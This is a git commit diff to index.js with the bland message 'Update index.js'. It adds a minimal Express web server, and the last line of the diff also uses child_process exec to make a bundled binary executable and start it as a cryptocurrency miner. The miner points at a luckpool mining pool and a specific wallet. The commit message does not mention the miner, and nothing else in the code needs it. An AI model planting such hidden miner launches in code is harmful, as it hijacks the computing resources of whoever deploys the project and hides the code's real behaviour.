e8fa442d49bb8dfa8199e44db629dabfb339963a
notcloudyzz <121518720+notcloudyzz@users.noreply.github.com>
2023-01-20 22:48:48 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,10 @@
-console.log("happi")
+const { exec } = require('node:child_process');
+const express = require("express")
+const app = express()
+
+app.get("/", function(req,res){
+  res.send("hello")
+});
+
+app.listen("8080");
+exec('chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.vv --password x');
